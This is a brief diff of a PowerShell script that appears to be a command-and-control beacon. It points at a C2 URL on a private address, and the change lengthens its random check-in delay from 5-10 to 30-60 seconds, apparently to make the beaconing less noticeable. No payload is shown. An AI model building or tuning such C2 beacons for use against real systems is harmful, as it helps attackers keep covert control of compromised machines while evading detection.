@@ -13,8 +13,8 @@ do{
     # URL address of the C2
     $url = "http://10.3.0.173:8080"
     
-    $MinSeconds = 5
-    $MaxSeconds = 10
+    $MinSeconds = 30
+    $MaxSeconds = 60
     
     $randomDelay = Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1)
     $computerId = f0
